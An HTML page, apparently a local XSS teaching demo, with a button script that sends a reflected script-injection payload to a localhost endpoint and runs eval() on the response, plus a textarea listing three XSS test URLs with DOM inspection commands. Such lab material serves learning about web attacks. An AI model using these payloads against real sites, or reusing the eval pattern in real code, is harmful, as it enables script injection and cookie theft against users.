<html>
  <head></head>
  <body>
    <center><h2 id="response"></h2></center>
    <script>
      document.cookie =
        "CookieName=SuperSecret;" + " Secure; SameSite=None; path=/";

      function xss() {
        const Http = new XMLHttpRequest();
        const url =
          "http://localhost:9081/xss-attack?xssvalue=%3Cscript+src=http://localhost:3000/xss/xss.js%3E+%3C%2Fscript%3E";
        //  "http://localhost:9081/xss-attack?xssvalue=<script src=http://localhost:3000/xss/xss.js>" +
        //  "%3C%2Fscript%3E";
        //"http://localhost:9081/xss-attack?xssvalue=eval(alert('xxxxx'))";
        //"http://localhost:9081/xss-attack?xssvalue=xxxxxxxxxxxxxxxxxxxxxxxxxx";

        Http.onreadystatechange = function () {
          if (this.readyState == 4 && this.status == 200) {
            eval(this.response);
            //document.getElementById("response").outerHTML = this.response;
          } else {
            document.getElementById("response").innerHTML = "Error";
          }
        };
        Http.open("GET", url);
        Http.send();
      }
    </script>

    Calling js function using HTML button <br /><br />
    <button onclick="xss()">Execute XSS!</button>

    <br /><br />
    Paste this into your browser's address bar to execute the XSS attack:
    <br />
    <textarea rows="25%" cols="100%">


XSS attack 1: 
---------------------
http://localhost:9081/xss-attack?xssvalue=<script>alert("XSS attack 1")</script>
document.getElementsByTagName('*')
document.getElementsByTagName("*")[2].innerHTML
document.getElementsByTagName("*")[2].outerHTML

non-XSS attack 2: String vs Script
-----------------------------------
http://localhost:9081/xss-attack?xssvalue=' <script>  alert('XSS attack 2') </script>'
document.getElementsByTagName('*')
document.getElementsByTagName("*")[4].innerHTML
document.getElementsByTagName("*")[4].outerHTML

XSS attack 3: script in JS file
-----------------------------------
http://localhost:9081/xss-attack?xssvalue=<script src=http://localhost:3000/xss/xss.js> </script>
document.getElementsByTagName('*')
document.getElementsByTagName("*")[2].innerHTML
document.getElementsByTagName("*")[2].outerHTML
</textarea
    >
  </body>
</html>
